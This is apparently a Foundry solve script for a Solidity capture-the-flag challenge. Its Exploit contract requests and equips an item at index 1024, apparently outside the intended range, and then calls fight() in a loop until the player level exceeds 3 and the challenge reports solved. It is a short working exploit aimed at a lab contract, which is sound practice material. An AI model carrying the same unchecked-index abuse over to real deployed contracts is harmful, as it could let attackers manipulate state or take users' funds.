// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Script,console} from "forge-std/Script.sol";
import {Setup,Chal} from "src/Setup.sol";

contract Solve is Script{
    function run()public{
        vm.startBroadcast();
        Setup setup=Setup(address(/**YOUR__SETUP__ADDRESS */));
        Exploit exploit=new Exploit();
        exploit.pwn(setup);
        vm.stopBroadcast();
    }
}


contract Exploit{

    function pwn(Setup setup)public{
        Chal chal=setup.TARGET();
        chal.createCharacter();
        uint256 index=1024;
        chal.getItem(index);
        chal.equipItem(index);
        uint256 count=0;
        while(chal.playerLevel()<=3){
            chal.fight();
            count++;
        }
        require(setup.isSolved(),"Exploit Failed");
        console.log(chal.playerLevel());
        console.log(count);
    }
}